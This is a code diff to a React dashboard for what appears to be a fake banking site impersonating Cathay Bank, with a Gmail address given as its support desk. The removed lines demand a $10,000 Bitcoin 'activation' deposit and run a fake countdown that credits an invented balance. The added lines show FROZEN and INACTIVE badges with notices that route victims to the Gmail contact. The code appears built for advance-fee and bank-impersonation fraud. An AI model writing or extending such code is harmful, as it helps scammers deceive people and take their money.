@@ -34,55 +34,6 @@ const Dashboard: React.FC = () => {
 
     const user = state.currentUser;
 
-    // 20-Minute Bitcoin Deposit Confirmation Countdown Timer
-    const [depositCountdown, setDepositCountdown] = useState<number>(() => {
-        if (!user?.depositProofTime) return 20 * 60;
-        const elapsed = (Date.now() - new Date(user.depositProofTime).getTime()) / 1000;
-        return Math.max(0, Math.floor(20 * 60 - elapsed));
-    });
-
-    useEffect(() => {
-        if (!user?.depositProofSubmitted || !user?.depositProofTime || user?.balance > 0) return;
-
-        const interval = setInterval(() => {
-            const elapsed = (Date.now() - new Date(user.depositProofTime!).getTime()) / 1000;
-            const remaining = Math.max(0, Math.floor(20 * 60 - elapsed));
-            setDepositCountdown(remaining);
-
-            if (remaining <= 0) {
-                clearInterval(interval);
-                const depositAmt = user.initialDeposit || 10000;
-                const updatedTxns = (user.transactions || []).map(tx => {
-                    if (tx.status === 'Pending' && tx.description.includes('Bitcoin')) {
-                        return { ...tx, status: 'Completed' as const };
-                    }
-                    return tx;
-                });
-                const completionNotif = {
-                    id: `notif_dep_comp_${Date.now()}`,
-                    title: "Bitcoin Deposit Credited Successfully",
-                    message: `Your initial Bitcoin deposit of $${depositAmt.toLocaleString()} USD has cleared network confirmations and has been added to your checking balance.`,
-                    date: new Date().toISOString(),
-                    read: false,
-                    type: 'success' as const
-                };
-                const updatedUser = {
-                    ...user,
-                    balance: (user.balance || 0) + depositAmt,
-                    transactions: updatedTxns,
-                    notifications: [completionNotif, ...(user.notifications || [])]
-                };
-                dispatch({ type: 'UPDATE_USER', payload: updatedUser });
-                fetch('/api/users/update', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(updatedUser)
-                }).catch(() => {});
-            }
-        }, 1000);
-
-        return () => clearInterval(interval);
-    }, [user?.depositProofSubmitted, user?.depositProofTime, user?.balance, user?.initialDeposit, dispatch]);
     const rawTransactions = useMemo(() => {
         const list = user?.transactions ? [...user.transactions] : [];
         return list.sort((a, b) => {
@@ -250,10 +201,28 @@ const Dashboard: React.FC = () => {
                         {isBalanceVisible ? formatCurrency(totalNetBalance, state.currentCurrency) : '••••••••'}
                     </h1>
 
-                    <div className="flex items-center justify-center gap-2 text-[9px] text-slate-300 font-bold uppercase tracking-wider mt-2">
+                    <div className="flex items-center justify-center gap-2 text-[9px] text-slate-300 font-bold uppercase tracking-wider mt-2 flex-wrap">
                         <span>Routing: <strong className="text-white">122000496</strong></span>
                         <span>•</span>
                         <span>Account: <strong className="text-white">{user?.accountNumber || '2890155789'}</strong></span>
+                        {(user?.isFrozen || user?.accountStatus === 'frozen') && (
+                            <>
+                                <span>•</span>
+                                <span className="px-2 py-0.5 rounded-full bg-cyan-500/30 text-cyan-200 border border-cyan-400/60 font-black text-[9px] tracking-wider animate-pulse flex items-center gap-1">
+                                    <Snowflake className="w-2.5 h-2.5" />
+                                    FROZEN
+                                </span>
+                            </>
+                        )}
+                        {(user?.isInactive || user?.accountStatus === 'inactive') && (
+                            <>
+                                <span>•</span>
+                                <span className="px-2 py-0.5 rounded-full bg-slate-500/40 text-slate-200 border border-slate-400/60 font-black text-[9px] tracking-wider flex items-center gap-1">
+                                    <PauseCircle className="w-2.5 h-2.5" />
+                                    INACTIVE
+                                </span>
+                            </>
+                        )}
                         <button onClick={handleRefresh} disabled={isRefreshing} className="ml-1 hover:text-white transition">
                             <RefreshCw className={`w-3 h-3 ${isRefreshing ? 'animate-spin' : ''}`} />
                         </button>
@@ -286,7 +255,7 @@ const Dashboard: React.FC = () => {
                                     </span>
                                 </div>
                                 <p className="text-xs text-cyan-100/90 font-medium leading-relaxed">
-                                    {user?.freezeMessage || user?.transferFreezeMessage || `Dear ${user?.name || 'Account Holder'}, your Cathay Bank account has been placed under temporary security freeze by Bank Administration. Outgoing wires, external transfers, and card payments are temporarily locked to safeguard your funds until identity clearance is confirmed.`}
+                                    {user?.freezeMessage || `Dear ${user?.name || 'Customer'}, your account is frozen. Please contact support for help at supportcathaybankusa@gmail.com.`}
                                 </p>
                                 <div className="mt-2.5 pt-2 border-t border-cyan-500/20 flex items-center justify-between text-[10px] text-cyan-300/80 font-bold flex-wrap gap-2">
                                     <span>Direct Resolution Desk: supportcathaybankusa@gmail.com</span>
@@ -387,61 +356,12 @@ const Dashboard: React.FC = () => {
                                     </span>
                                 </div>
                                 <p className="text-xs text-slate-300 font-medium leading-relaxed">
-                                    {user?.inactiveMessage || "Your bank account is currently inactive. Please contact administration to reactivate your banking services."}
+                                    {user?.inactiveMessage || `Dear ${user?.name || 'Customer'}, your account is inactive. Please contact the customer support team at supportcathaybankusa@gmail.com to activate your account.`}
                                 </p>
                                 <div className="mt-2.5 pt-2 border-t border-slate-700/40 flex items-center justify-between text-[10px] text-slate-400 font-bold flex-wrap gap-2">
                                     <span>Support: supportcathaybankusa@gmail.com</span>
                                     <span className="font-mono uppercase">Ref: #INA-{user?.accountNumber || 'AUTH'}</span>
                                 </div>
-                            </div>
-                        </div>
-                    </div>
-                )}
-                {/* Account Initial Deposit & Activation Reminder Banner */}
-                {user && user.balance === 0 && !user.name?.toLowerCase().includes('james michael') && (
-                    <div className="bg-gradient-to-r from-amber-500/20 via-amber-500/10 to-orange-500/20 border-2 border-amber-500/40 dark:border-amber-400/40 rounded-2xl p-4 shadow-md backdrop-blur-md">
-                        <div className="flex items-start gap-3">
-                            <div className="w-10 h-10 rounded-xl bg-amber-500 text-slate-950 font-black text-lg flex items-center justify-center shrink-0 shadow-md">
-                                ₿
-                            </div>
-                            <div className="flex-1 min-w-0">
-                                <div className="flex items-center justify-between gap-2 mb-1">
-                                    <h4 className="text-xs font-black uppercase text-amber-900 dark:text-amber-300 tracking-wider">
-                                        Account Activation Required
-                                    </h4>
-                                    <span className="text-[9px] font-black uppercase bg-amber-200 dark:bg-amber-900/60 text-amber-900 dark:text-amber-200 px-2 py-0.5 rounded-full">
-                                        Pending Initial Deposit
-                                    </span>
-                                </div>
-                                <p className="text-xs font-semibold text-slate-800 dark:text-slate-200 leading-snug mb-2">
-                                    Activate your account by depositing the initial deposit amount of <strong className="text-amber-600 dark:text-amber-400 font-black">${(user.initialDeposit || 10000).toLocaleString()}</strong> via your secure Bitcoin wallet.
-                                </p>
-
-                                {user.depositProofSubmitted ? (
-                                    <div className="p-3 bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-300 dark:border-emerald-700 rounded-xl text-emerald-800 dark:text-emerald-300 text-xs flex items-center justify-between gap-3">
-                                        <div className="flex items-center gap-2">
-                                            <Clock className="w-4 h-4 text-emerald-600 animate-spin-slow shrink-0" />
-                                            <div>
-                                                <p className="font-bold text-[11px]">Deposit Proof Submitted & Verifying</p>
-                                                <p className="text-[10px] text-muted-foreground">Confirming on Bitcoin Blockchain Network</p>
-                                            </div>
-                                        </div>
-                                        <div className="text-right shrink-0 bg-emerald-100 dark:bg-emerald-900/60 px-2.5 py-1 rounded-lg border border-emerald-300 dark:border-emerald-700">
-                                            <span className="text-[9px] font-black uppercase text-emerald-700 dark:text-emerald-300 block">Arrival in</span>
-                                            <span className="text-xs font-mono font-black text-emerald-900 dark:text-emerald-100">
-                                                {Math.floor(depositCountdown / 60)}m {String(depositCountdown % 60).padStart(2, '0')}s
-                                            </span>
-                                        </div>
-                                    </div>
-                                ) : (
-                                    <button
-                                        onClick={() => dispatch({ type: 'SET_PAGE', payload: Page.DEPOSIT })}
-                                        className="bg-amber-500 hover:bg-amber-600 text-slate-950 font-black text-xs uppercase px-4 py-2 rounded-xl shadow-md transition flex items-center gap-1.5"
-                                    >
-                                        <span>Deposit via Bitcoin Wallet (36JFNg...)</span>
-                                        <ChevronRight className="w-3.5 h-3.5" />
-                                    </button>
-                                )}
                             </div>
                         </div>
                     </div>
